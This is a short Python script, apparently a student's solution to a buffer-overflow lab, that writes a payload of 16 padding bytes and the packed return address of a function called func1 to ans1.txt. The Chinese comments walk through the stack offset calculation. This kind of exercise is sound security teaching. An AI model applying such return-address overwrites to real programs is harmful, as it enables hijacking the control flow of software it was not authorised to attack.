import struct

# 确定Padding长度
# 缓冲区从rbp-0x8开始，返回地址在rbp+0x8
# 距离 = 8(local buffer) + 8(saved rbp) = 16字节
padding_len = 16
padding = b'A' * padding_len

# 确定目标跳转地址 (func1 的地址)
# 根据汇编: 0000000000401216 <func1>
target_address = 0x401216

# 将地址打包成64位小端序
# '<Q'代表 little-endian unsigned long long (8 bytes)
func1_addr = struct.pack('<Q', target_address)

# 拼接Payload
payload = padding + func1_addr

# 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)
    print(f"Payload generated: {len(payload)} bytes written to ans1.txt")
    print(f"Padding: {padding_len} bytes")
    print(f"Target Addr: {hex(target_address)}")